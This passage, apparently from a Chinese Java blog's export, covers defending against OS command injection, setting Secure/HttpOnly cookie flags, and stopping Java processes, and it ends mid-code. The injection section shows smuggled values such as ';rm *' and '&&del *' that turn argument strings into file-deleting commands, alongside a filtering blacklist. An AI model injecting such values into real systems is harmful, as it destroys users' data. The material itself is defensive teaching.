后面部分是用户输入的，用户输入通过注入符号<code>;</code>和后续指令<code>rm *</code>，被系统执行。<br>execve, CreateProcessW 函数通过执行命令和参数分别传递的方式，这种方式杜绝了system的拼接命令的方式，有一定的安全性，但也未必是安全的。</p><p>例如windows下的<code>cmd.exe /K</code>参数可以批量执行命令。如果传入<code>&amp;&amp;del *</code>,最后变成<br><code>cmd.exe /K &quot;del C:\\test1.txt &amp;&amp; del *&amp;&amp;del C:\\test2.txt&quot;</code>.<br>Unix下的<code>/bin/bash –c</code>参数，后续输入参数为执行命令，如果传入<code>;rm *</code>,最后等效于<br><code>/bin/bash –c &quot;sh script.sh; rm *&quot;</code>.</p><p>所以我们应该对参数进行过滤/转码</p><h3 id="常用黑名单"><a href="#常用黑名单" class="headerlink" title="常用黑名单"></a>常用黑名单</h3><p>a. |;&amp;$&gt;&lt;<code>\!可以将这些字符直接作为黑名单过滤 b. \t\n\r\f \u0000 这些字符需要作为黑名单过滤，特别是空字符截断</code>\u0000` (这个在JVM6里是没有保护)</p><p>白名单一般只需允许<code>[a-z][A-Z][0-9] _-</code>等有限的字符.</p><h3 id="常用shell命令的转码"><a href="#常用shell命令的转码" class="headerlink" title="常用shell命令的转码"></a>常用shell命令的转码</h3><p>![常用shell命令的转码](common shell trans.png)<br>参考<a href="http://blog.csdn.net/raintungli/article/details/51917122">博客</a>。</p>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>servlet 2.5及3.0设置cookie secure httponly等属性</title>
    <url>/2017/02/27/servlet-2-5-and-3-0-set-cookie-secure-httponly/</url>
    <content><![CDATA[<p>安全标记是可以由应用服务器的HTTP响应中发送一个新的cookie给用户时，可以设置一个选项。安全标志的目的是阻止cookies未授权方被观察由于Cookie的明文传输。<br>为了实现这一目标，支持安全标志的浏览器将只与安全标志时请求去一个HTTPS页面发送cookie。以另一种方式说，浏览器不会设置通过未加密的HTTP请求的安全标志发送的cookie。<br>通过设置安全标记，浏览器将防止通过未加密的信道的cookie的传输。<br><a href="https://www.owasp.org/index.php/SecureFlag">SecureFlag</a></p><p>增加 cookie 安全性添加HttpOnly和secure属性</p><h2 id="属性简单说明"><a href="#属性简单说明" class="headerlink" title="属性简单说明"></a>属性简单说明</h2><h3 id="secure属性"><a href="#secure属性" class="headerlink" title="secure属性"></a>secure属性</h3><p>当设置为true时，表示创建的 Cookie 会被以安全的形式向服务器传输，也就是只能在 HTTPS 连接中被浏览器传递到服务器端进行会话验证，如果是 HTTP 连接则不会传递该信息，所以不会被窃取到Cookie 的具体内容。</p><h3 id="HttpOnly属性"><a href="#HttpOnly属性" class="headerlink" title="HttpOnly属性"></a>HttpOnly属性</h3><p>如果在Cookie中设置了”HttpOnly”属性，那么通过程序(JS脚本、Applet等)将无法读取到Cookie信息，这样能有效的防止XSS攻击。</p><h2 id="Servlet不同版本Web-xml的差异"><a href="#Servlet不同版本Web-xml的差异" class="headerlink" title="Servlet不同版本Web.xml的差异"></a>Servlet不同版本Web.xml的差异</h2><p><code>web.xml</code>是Java Web Application的一种描述Web项目如何部署的配置文件。</p><h3 id="1-Servlet-3-1-deployment-descriptor-Java-EE-7"><a href="#1-Servlet-3-1-deployment-descriptor-Java-EE-7" class="headerlink" title="1.Servlet 3.1 deployment descriptor,Java EE 7"></a>1.Servlet 3.1 deployment descriptor,Java EE 7</h3><p>Java EE 7 XML schema, namespace is <a href="http://xmlns.jcp.org/xml/ns/javaee/">http://xmlns.jcp.org/xml/ns/javaee/</a></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee </span></span></span><br><span class="line"><span class="tag"><span class="string">         http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"3.1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-Servlet-3-0-deployment-descriptor-Java-EE-6"><a href="#2-Servlet-3-0-deployment-descriptor-Java-EE-6" class="headerlink" title="2. Servlet 3.0 deployment descriptor,Java EE 6"></a>2. Servlet 3.0 deployment descriptor,Java EE 6</h3><p>Java EE 6 XML schema, namespace is <a href="http://java.sun.com/xml/ns/javaee">http://java.sun.com/xml/ns/javaee</a></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/javaee </span></span></span><br><span class="line"><span class="tag"><span class="string">          http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">version</span>=<span class="string">"3.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-Servlet-2-5-deployment-descriptor-Java-EE-5"><a href="#3-Servlet-2-5-deployment-descriptor-Java-EE-5" class="headerlink" title="3. Servlet 2.5 deployment descriptor,Java EE 5"></a>3. Servlet 2.5 deployment descriptor,Java EE 5</h3><p>Java EE 5 XML schema, namespace is <a href="http://java.sun.com/xml/ns/javaee">http://java.sun.com/xml/ns/javaee</a></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/javaee </span></span></span><br><span class="line"><span class="tag"><span class="string">          http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">version</span>=<span class="string">"2.5"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-Servlet-2-4-deployment-descriptor-J2EE-1-4"><a href="#4-Servlet-2-4-deployment-descriptor-J2EE-1-4" class="headerlink" title="4. Servlet 2.4 deployment descriptor,J2EE 1.4"></a>4. Servlet 2.4 deployment descriptor,J2EE 1.4</h3><p>J2EE 1.4 XML schema, namespace is <a href="http://java.sun.com/xml/ns/j2ee">http://java.sun.com/xml/ns/j2ee</a></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/j2ee"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/j2ee </span></span></span><br><span class="line"><span class="tag"><span class="string">          http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">version</span>=<span class="string">"2.4"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Servlet 2.4 Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-Servlet-2-3-deployment-descriptor-J2EE-1-3"><a href="#5-Servlet-2-3-deployment-descriptor-J2EE-1-3" class="headerlink" title="5. Servlet 2.3 deployment descriptor,J2EE 1.3"></a>5. Servlet 2.3 deployment descriptor,J2EE 1.3</h3><p>J2EE 1.3 DTDs schema. This web.xml file is too old, highly recommend you to upgrade it.</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Servlet 2.3 Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Servlet 2.3到3.0之间的改变可以访问<a href="http://en.wikipedia.org/wiki/Java_Servlet">Servlet wiki</a>查看详细。</p><h2 id="设置Cookie属性"><a href="#设置Cookie属性" class="headerlink" title="设置Cookie属性"></a>设置Cookie属性</h2><h3 id="Servlet-3-0-及以上版本设置Web-xml"><a href="#Servlet-3-0-及以上版本设置Web-xml" class="headerlink" title="Servlet 3.0 及以上版本设置Web.xml"></a>Servlet 3.0 及以上版本设置Web.xml</h3><p>Servlet 3.0及以上版本支持在Web.xml中设置所有的session cookie 属性为Secure HttpOnly。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cookie-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">secure</span>&gt;</span>true<span class="tag">&lt;/<span class="name">secure</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">http-only</span>&gt;</span>true<span class="tag">&lt;/<span class="name">http-only</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cookie-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DWR的cookie-DWRSESSIONID的设置"><a href="#DWR的cookie-DWRSESSIONID的设置" class="headerlink" title="DWR的cookie DWRSESSIONID的设置"></a>DWR的cookie DWRSESSIONID的设置</h3><p>DWR默认cookie值 <code>path=${contextPath}</code></p><p>Examples of attribute strings:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">domain=mydomain.com</span><br><span class="line">path=/mypath; secure</span><br></pre></td></tr></table></figure><p>The cookie attributes are configured through the cookieAttributes setting in web.xml:</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>cookieAttributes<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>path=/mypath; secure<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure><p>or setter from JavaScript after including engine.js:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">dwr.engine.setCookieAttributes(<span class="string">"path=/mypath; secure"</span>);</span><br></pre></td></tr></table></figure><p>or by making configuration before including engine.js:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> dwrConfig &#123;</span><br><span class="line">    cookieAttributes: <span class="string">"path=/mypath; secure"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>or the corresponding for AMD loading:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>.config(&#123;</span><br><span class="line">    (other AMD settings)</span><br><span class="line">    config: &#123;</span><br><span class="line">        <span class="string">"dwr/amd/engine"</span>: &#123;</span><br><span class="line">            cookieAttributes: <span class="string">"path=/mypath; secure"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="在Java代码中为Cookie写Filter"><a href="#在Java代码中为Cookie写Filter" class="headerlink" title="在Java代码中为Cookie写Filter"></a>在Java代码中为Cookie写Filter</h3><p>在Web.xml中配置CookieFilter</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>cookieFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.test.CookieFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>cookieFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CookieFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,  </span></span></span><br><span class="line"><span class="function"><span class="params">            FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;  </span><br><span class="line">        HttpServletRequest req = (HttpServletRequest) request;  </span><br><span class="line">        HttpServletResponse resp = (HttpServletResponse) response;  </span><br><span class="line">  </span><br><span class="line">        Cookie[] cookies = req.getCookies();  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (cookies != <span class="keyword">null</span>) &#123;  </span><br><span class="line">                Cookie cookie = cookies[<span class="number">0</span>];  </span><br><span class="line">                <span class="keyword">if</span> (cookie != <span class="keyword">null</span>) &#123;  </span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    cookie.setMaxAge(3600); </span></span><br><span class="line"><span class="comment">                    cookie.setSecure(true); </span></span><br><span class="line"><span class="comment">                    resp.addCookie(cookie);</span></span><br><span class="line"><span class="comment">                    */</span>  </span><br><span class="line">                      </span><br><span class="line">                    <span class="comment">//Servlet 2.5不支持在Cookie上直接设置HttpOnly属性  </span></span><br><span class="line">                    String value = cookie.getValue();  </span><br><span class="line">                    StringBuilder builder = <span class="keyword">new</span> StringBuilder();  </span><br><span class="line">                    builder.append(<span class="string">"JSESSIONID="</span> + value + <span class="string">"; "</span>);  </span><br><span class="line">                    builder.append(<span class="string">"Secure; "</span>);  </span><br><span class="line">                    builder.append(<span class="string">"HttpOnly; "</span>);  </span><br><span class="line">                    Calendar cal = Calendar.getInstance();  </span><br><span class="line">                    cal.add(Calendar.HOUR, <span class="number">1</span>);  </span><br><span class="line">                    Date date = cal.getTime();  </span><br><span class="line">                    Locale locale = Locale.CHINA;  </span><br><span class="line">                    SimpleDateFormat sdf =   </span><br><span class="line">                            <span class="keyword">new</span> SimpleDateFormat(<span class="string">"dd-MM-yyyy HH:mm:ss"</span>,locale);  </span><br><span class="line">                    builder.append(<span class="string">"Expires="</span> + sdf.format(date));  </span><br><span class="line">                    resp.setHeader(<span class="string">"Set-Cookie"</span>, builder.toString());  </span><br><span class="line"></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    String sessionid = request.getSession().getId();</span></span><br><span class="line"><span class="comment">                    response.setHeader("SET-COOKIE", "JSESSIONID=" + sessionid + "; secure");</span></span><br><span class="line"><span class="comment">                    */</span> </span><br><span class="line">                &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        chain.doFilter(req, resp);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig arg0)</span> <span class="keyword">throws</span> ServletException </span>&#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="在WAS中设置cookie-secure"><a href="#在WAS中设置cookie-secure" class="headerlink" title="在WAS中设置cookie secure"></a>在WAS中设置cookie secure</h2><p>在IBM Webphere ,WAS中设置cookie secure，可以考虑修改WAS配置。</p><h3 id="To-set-Secure-flag-to-JSESSIONID-cookie-same-for-WebSphere-7-x-and-8-x"><a href="#To-set-Secure-flag-to-JSESSIONID-cookie-same-for-WebSphere-7-x-and-8-x" class="headerlink" title="To set Secure flag to JSESSIONID cookie (same for WebSphere 7.x and 8.x)"></a>To set Secure flag to JSESSIONID cookie (same for WebSphere 7.x and 8.x)</h3><pre><code>1. log in log in WebSphere admin console
2. Navigate to Server &gt; Server types &gt; WebSphere application servers
3. Click on server name (default is server1)
4. Click on link Web Container settings &gt; Web Container
5. Click on link Session Management
6. Click on link Enable Cookies. This bit a litle bit confusing, you have to click on text not on the check box
7. select option (check box) Restrict cookies to HTTPS sessions
8. Save changes</code></pre><h3 id="To-set-HttpOnly-flag-in-WebSphere-8-x-to-JSESSIONID-cookie"><a href="#To-set-HttpOnly-flag-in-WebSphere-8-x-to-JSESSIONID-cookie" class="headerlink" title="To set HttpOnly flag in WebSphere 8.x to JSESSIONID cookie"></a>To set HttpOnly flag in WebSphere 8.x to JSESSIONID cookie</h3><pre><code>1. log in log in WebSphere admin console
2. Navigate to Server &gt; Server types &gt; WebSphere application servers
3. Click on server name (default is server1)
4. Click on link Web Container settings &gt; Web Container
5. Click on link Session Management
6. Click on link Enable Cookies. This bit a litle bit confusing, you have to click on text not on the check box
7. select option (check box) Set session cookies to HTTPOnly to help prevent cross-site scripting attacks
8. Save changes</code></pre><h3 id="To-set-HttpOnly-flag-in-WebSphere-7-x-to-JSESSIONID-cookie"><a href="#To-set-HttpOnly-flag-in-WebSphere-7-x-to-JSESSIONID-cookie" class="headerlink" title="To set HttpOnly flag in WebSphere 7.x to JSESSIONID cookie"></a>To set HttpOnly flag in WebSphere 7.x to JSESSIONID cookie</h3><pre><code>1. log in log in WebSphere admin console
2. Navigate to Server &gt; Server types &gt; WebSphere application servers
3. Click on server name (default is server1)
4. Click on link Web Container settings &gt; Web Container
5. Click on link Custom Proprties
6. Click on button New
7. Enter name: com.ibm.ws.webcontainer.httpOnlyCookies value:* (HttpOnly will be set on all cookies not only JSESSIONID)
8. Click on OK button
9. Save changes</code></pre>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>安全</tag>
        <tag>AppScan</tag>
      </tags>
  </entry>
  <entry>
    <title>关闭Java进程</title>
    <url>/2016/05/11/shutdown-process-java/</url>
    <content><![CDATA[<p>Java应用程序退出的触发机制有：</p><ol><li>自动结束：应用没有存活线程或只有后台线程时;</li><li>System.exit(0);</li><li>kill 或 ctrl+C;</li><li>kill -9 强制退出，会导致数据丢失;</li><li>通过kill -s TERM PID,传递信号给Java进程，然后程序中进行退出操作;</li><li>注册一个钩子函数，使用kill时，java虚拟机会对钩子函数中资源进行回收;</li><li>监控一个shutdown file是否存在，可以通过给file设定权限，只有拥有权限的人才能停止进程;</li><li>另外打开一个端口，监听端口里的命令，收到命令后调用System.exit;</li><li>通过JMX的mbean远程控制来实现;</li></ol><h2 id="使用命令直接关闭Java进程"><a href="#使用命令直接关闭Java进程" class="headerlink" title="使用命令直接关闭Java进程"></a>使用命令直接关闭Java进程</h2><h3 id="linux环境，使用kill-9-15-pid"><a href="#linux环境，使用kill-9-15-pid" class="headerlink" title="linux环境，使用kill -9/-15 pid"></a>linux环境，使用kill -9/-15 pid</h3><p>kill -15 pid 据说比-9更安全</p><p>方法1：截取进程pid，再kill</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -ef | grep root(当前登录用户) | grep test.jar | grep -v grep | cut -c10-15 | xargs kill -9</span><br></pre></td></tr></table></figure><p>方法2：</p><p>1）找到linux下的所有Java进程的pids</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -ef  | grep 当前登录用户 | grep test.jar | grep -v grep | awk '&#123;print $2&#125;'</span><br></pre></td></tr></table></figure><p>2）循环得到的pids，kill -9 pid</p><h3 id="windows环境，使用taskkill"><a href="#windows环境，使用taskkill" class="headerlink" title="windows环境，使用taskkill"></a>windows环境，使用taskkill</h3><p>kill 命令行参数中带tomcat字符串的 java.exe 进程</p><p>方法1：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wmic process where (Name="java.exe" AND CommandLine like "%%tomcat%%") call terminate &gt;nul 2&gt;nul</span><br></pre></td></tr></table></figure><p>方法2：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;wmic process where name="javaw.exe" get Processid</span><br><span class="line">ProcessId</span><br><span class="line">768</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;taskkill /F /PID 768</span><br><span class="line">成功: 已终止 PID 为 768 的进程。</span><br></pre></td></tr></table></figure><h2 id="Java进程接收信号，程序进行退出相关操作"><a href="#Java进程接收信号，程序进行退出相关操作" class="headerlink" title="Java进程接收信号，程序进行退出相关操作"></a>Java进程接收信号，程序进行退出相关操作</h2><h3 id="信号简介"><a href="#信号简介" class="headerlink" title="信号简介"></a>信号简介</h3><p>信号是在软件层次上对中断机制的一种模拟，在原理上，一个进程收到一个信号与处理器收到一个中断请求可以说是一样的。<br>通俗来讲，信号就是进程间的一种异步通信机制。<br>典型的例子:<br><code>kill -s SIGKILL pid</code> (即<code>kill -9 pid</code>) 立即杀死指定pid的进程。<br>在上面这个例子中，SIGKILL就是往pid进程发送的信号。</p><h3 id="平台相关性"><a href="#平台相关性" class="headerlink" title="平台相关性"></a>平台相关性</h3><p>信号具有平台相关性，不同平台下能使用的信号种类是有差异的。<br>在Linux下支持的信号(对比信号列表查看描述)<br><code>SEGV, ILL, FPE, BUS, SYS, CPU, FSZ, ABRT, INT, TERM, HUP, USR1, USR2, QUIT, BREAK, TRAP, PIPE</code><br>在Windows下支持的信号<br><code>SEGV, ILL, FPE, ABRT, INT, TERM, BREAK</code></p><h3 id="信号选择"><a href="#信号选择" class="headerlink" title="信号选择"></a>信号选择</h3><p>为了不干扰正常信号的运作，又能模拟Java异步通知，我们需要先选定一种特殊的信号。<br>通过查看信号列表上的描述，发现 SIGUSR1 和 SIGUSR2 是允许用户自定义的信号。<br>那么选择它们，理论上就不会影响正常功能了。<br>这里我选用了USR2作为传递信号。原因是USR1有可能已被其他APP占用。</p><h3 id="实例代码"><a href="#实例代码" class="headerlink" title="实例代码"></a>实例代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在Java编程中使用信号的实际收益</span></span><br><span class="line"><span class="keyword">import</span> sun.misc.SignalHandler; </span><br><span class="line"><span class="keyword">import</span> sun.misc.Signal; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// install signals  </span></span><br><span class="line">Signal sig = <span class="keyword">new</span> Signal(<span class="string">"USR2"</span>);  </span><br><span class="line">Signal.handle(sig, <span class="keyword">new</span> SignalHandler ()&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(Signal signalName)</span> </span>&#123;  </span><br><span class="line">               System.out.println(signalName.getName() + <span class="string">" is recevied."</span>); </span><br><span class="line">               <span class="comment">//do some things </span></span><br><span class="line">               <span class="comment">//也可以另外定义一个类实现SignalHandler接口</span></span><br><span class="line">        &#125;  </span><br><span class="line">&#125;);  </span><br><span class="line"></span><br><span class="line">Signal sigTERM = <span class="keyword">new</span> Signal(<span class="string">"TERM"</span>);<span class="comment">/* 注册KILL信号 */</span></span><br><span class="line">Signal sigINT = <span class="keyword">new</span> Signal(<span class="string">"INT"</span>);<span class="comment">/* 注册CTRL+C信号 */</span></span><br></pre></td></tr></table></figure><p>发送信号前，需要先通过 ps 或 jps 获取java的进程id，然后运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kill -s SIGUSR2 pid</span><br></pre></td></tr></table></figure><p>如果在java的stdout 看到 SIGUSR2 is recevied 字样，说明信号被成功送达了。</p><h3 id="在Java编程中使用信号的实际收益"><a href="#在Java编程中使用信号的实际收益" class="headerlink" title="在Java编程中使用信号的实际收益"></a>在Java编程中使用信号的实际收益</h3><p>信号作为最原始的进程间异步通信手段，有着诸多局限性的，比如不能传递上下文，信号随时都可能被占用导致冲突，不具备扩展性等，所以对功能性需求来说，使用它收益甚微。</p><p>当然，信号也不是一无是处，除了用作简单的异步通知外，还可以利用它的进程事件通知功能。</p><p>在Java里有一个典型例子，就是 ShutdownHook。</p><p><a href="http://blog.csdn.net/kevinzhangfei/article/details/6997110">原文链接</a></p><h2 id="启动时注册一个钩子函数"><a href="#启动时注册一个钩子函数" class="headerlink" title="启动时注册一个钩子函数"></a>启动时注册一个钩子函数</h2><p>每个java进程都可以注册钩子线程，钩子线程程在程序退出的前被执行（kill -9强制退出除外）<br>java的hook ，钩子函数，在虚拟机启动时注册一个钩子函数，在程序退出(如使用kill命令，kill -9强制退出除外)前将会执行，java虚拟机会对钩子函数中资源进行回收。</p><p>关闭钩子 只是一个已初始化但尚未启动的线程。虚拟机开始启用其关闭序列时，它会以某种未指定的顺序启动所有已注册的关闭钩子，并让它们同时运行。运行完所有的钩子 后，如果已启用退出终结，那么虚拟机接着会运行所有未调用的终结方法。最后，虚拟机会暂停。注意，关闭序列期间会继续运行守护线程，如果通过调用 exit 方法来发起关闭序列，那么也会继续运行非守护线程。</p><p>一旦开始了关闭序列，则只能通过调用 halt 方法来停止这个序列，此方法可强行终止虚拟机。</p><p>一旦开始了关闭序列，则不可能注册新的关闭钩子或取消注册先前已注册的钩子。尝试执行这些操作会导致抛出 IllegalStateException 。</p><p>关闭钩子可在虚拟机生命周期中的特定时间运行，因此应保护性地对其进行编码。特别是应将关闭钩子编写为线程安全的，并尽可能地避免死锁。关闭钩子还应该不 盲目地依靠某些服务，这些服务可能已注册了自己的关闭钩子，所以其本身可能正处于关闭进程中。例如，试图使用其他基于线程的服务（如 AWT 事件指派线程）可能导致死锁。</p><p>关闭钩子应该快速地完成其工作。当程序调用 exit 时，虚拟机应该迅速地关闭并退出。由于用户注销或系统关闭而终止虚拟机时，底层的操作系统可能只允许在固定的时间内关闭并退出。因此在关闭钩子中尝试进行任何用户交互或执行长时间的计算都是不明智的。</p><p>与其他所有线程一样，通过调用线程 ThreadGroup 对象的 uncaughtException 方法，可在关闭钩子中处理未捕获的异常。此方法的默认实现是将该异常的堆栈跟踪打印至 System#err 并终止线程；它不会导致虚拟机退出或暂停。<br>仅在很少的情况下，虚拟机可能会中止 ，也就是没有完全关闭就停止运行。虚拟机被外部终止时会出现这种现象，比如在 Unix 上使用 SIGKILL 信号或者在 Microsoft Windows 上调用 TerminateProcess 。如果由于内部数据结构损坏或试图访问不存在的内存而导致本机方法执行错误，那么可能也会中止虚拟机。如果虚拟机中止，则无法保证是否将运行关闭钩子。</p><p>注册钩子线程代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//t为线程</span></span><br><span class="line">Runtime.getRuntime().addShutdownHook(t);</span><br></pre></td></tr></table></figure><p>我们可以在钩子线程里做一些善后数据清理等事情，以保证程序是平滑退出的。<br>一般服务或框架运行都要考虑其生命周期：<br>如<code>spring</code>容器的<code>context.stop()</code>方法。<br>再如线程池<code>ExecutorService</code>的<code>shutdown</code>方法，它会保证不接受新任务，并把未执行完的任务做完。</p><p>我们再设计服务的时候也要考虑到停止时的<code>stop</code>方法，以便于退出时由钩子线程调用。</p><p>注册了钩子线程后，程序收到退出信号后，会保持程序运行，直到钩子线程执行完毕，才把程序的所有线程停止并退出，下面示例代码可以说明这一点：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShutDownTest</span> </span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;  </span><br><span class="line">        <span class="comment">//注册第一个钩子  </span></span><br><span class="line">        Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> Thread() &#123;  </span><br><span class="line">  </span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    